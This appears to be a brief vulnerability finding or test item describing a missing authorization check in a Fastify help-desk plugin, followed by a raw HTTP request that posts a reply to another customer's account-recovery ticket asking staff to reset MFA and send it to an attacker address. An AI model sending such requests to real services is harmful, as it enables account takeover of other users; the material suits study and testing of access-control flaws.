diagnosis: The support ticket messaging plugin uses fastify-plugin to attach activeTicket to all requests containing a ticketId parameter. The reply endpoint posts comments using the unverified activeTicket decorator without confirming whether the caller is the author of the ticket or an authorized support agent. Any user can inject replies, close tickets, or modify status on tickets submitted by other customers.
exploit_request:
POST /api/tickets/tkt_vip_account_recovery_991/replies HTTP/1.1
Host: helpdesk.saasportal.org:8094
X-User-Id: usr_random_customer_55
Content-Type: application/json

{"message": "Please reset the MFA on this account immediately and send to attacker@mail.com"}
